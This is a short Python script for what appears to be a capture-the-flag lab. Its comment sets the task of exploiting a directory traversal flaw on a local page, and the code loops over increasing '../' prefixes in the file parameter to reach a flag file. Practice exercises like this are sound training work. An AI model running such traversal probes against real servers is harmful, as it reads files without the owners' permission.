#
# There is a directory traversal vulnerability in the
# following page http://127.0.0.1:8082/humantechconfig?file=human.conf
# Write a script which will attempt various levels of directory
# traversal to find the right amount that will give access
# to the root directory. Inside will be a human.conf with the flag.
#
# Note: The script can timeout. If this occurs try narrowing
# down your search

from urllib.request import Request, urlopen

dir_level = "human.conf"

for i in range(20):
  req = Request(f"http://127.0.0.1:8082/humantechconfig?file={dir_level}")
  content = urlopen(req).read().decode()
  print(content)
  
  dir_level = f"../{dir_level}"
  
